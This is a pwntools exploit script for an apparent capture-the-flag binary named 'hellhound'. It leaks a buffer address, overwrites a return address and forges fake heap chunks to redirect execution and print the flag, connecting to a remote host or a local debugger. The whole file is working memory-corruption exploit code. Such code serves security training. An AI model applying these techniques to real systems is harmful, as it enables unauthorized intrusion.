#!/usr/bin/env python3

from pwn import *
import sys

def exploit(io, elf):
    io.sendlineafter(b">> ", b"1")
    io.recvuntil(b": [")
    buffer = int(io.recvline()[:-2].decode())
    print("buffer: ", hex(buffer))    
    
    # overwrite ret address and construct fake heap chunk
    fake_heap = 0x602110
    payload = b"A"*8 + p64(buffer + 80)
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"code: ", payload)
    io.sendlineafter(b">> ", b"3")
    
    payload = p64(elf.symbols["berserk_mode_off"]) + p64(fake_heap - 8)
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"code: ", payload)
    io.sendlineafter(b">> ", b"3")
    
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"code: ", p64(0x61) + p64(fake_heap+0x58))
    io.sendlineafter(b">> ", b"3")

    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"code: ", p64(0x21) + p64(fake_heap))
    io.sendlineafter(b">> ", b"3")

    io.sendlineafter(b">> ", b"69")     
    io.recv()
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./hellhound")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    elf = ELF("./hellhound")
    exploit(io, elf)

if __name__ == "__main__":
    main()
